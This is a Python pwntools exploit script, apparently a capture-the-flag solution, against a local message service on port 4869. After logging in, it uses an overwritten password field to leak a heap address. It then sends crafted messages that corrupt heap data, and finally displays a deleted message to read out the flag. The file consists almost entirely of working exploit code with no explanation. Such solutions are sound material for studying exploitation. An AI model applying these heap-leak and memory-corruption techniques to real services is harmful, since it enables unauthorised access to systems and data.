#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "127.0.0.1"
port = 4869

context.arch = "amd64"    
r = remote(host,port)

def login(user,password):
    r.recvuntil("choice:")
    r.sendline("1")
    r.recvuntil("Username:")
    r.sendline(user)
    r.recvuntil("Password:")
    r.sendline(password)

def send(to,subject,msg):
    r.recvuntil("choice:")
    r.sendline("5")
    r.recvuntil("To:")
    r.sendline(to)
    r.recvuntil(":")
    r.sendline(subject)
    r.recvuntil("Length of Message:")
    r.sendline(str(len(msg)+1))
    r.recvuntil("Message:")
    r.send(msg)

def delallmsg():
    r.recvuntil("choice:")
    r.sendline("4")
    r.recvuntil("choice:")
    r.sendline("5")
    r.recvuntil("choice:")
    r.sendline("6")

def changepass(password):
    r.recvuntil("choice:")
    r.sendline("3")
    r.recvuntil("Password:")
    r.sendline("p@ssw0rd")
    r.recvuntil("Password:")
    r.send(password)

def userinfo():
    r.recvuntil("choice:")
    r.sendline("2")

def listallmsg():
    r.recvuntil("choice:")
    r.sendline("4")
    r.recvuntil("choice:")
    r.sendline("1")
    r.recvuntil("choice:")
    r.sendline("6")

def delmsg(idx):
    r.recvuntil("choice:")
    r.sendline("4")
    r.recvuntil("choice:")
    r.sendline("4")
    r.recvuntil("Index:")
    r.sendline(str(idx))
    r.recvuntil("choice:")
    r.sendline("6")

def display(idx):
    r.recvuntil("choice:")
    r.sendline("4")
    r.recvuntil("choice:")
    r.sendline("3")
    r.recvuntil("Index:")
    r.sendline(str(idx))

login("ddaa","p@ssw0rd")
changepass("x"*0x10)
userinfo()
r.recvuntil("x"*0x10)
heap = u64(r.recvuntil("\n")[:-1].ljust(8,b"\x00")) - 0x1530
print("heap:",hex(heap))
flag = heap+0x480
delallmsg()

send("ddaa","nogg","q"*0x20)
send("ddaa",p64(0), p32(0x00109601) +b"y"*0x18)
send("ddaa","nogg",b"z"*0x81 + p64(flag))
listallmsg()
delmsg(0)
display(0)
r.recvuntil("Message:")
print("flag:",r.recv(0x20))
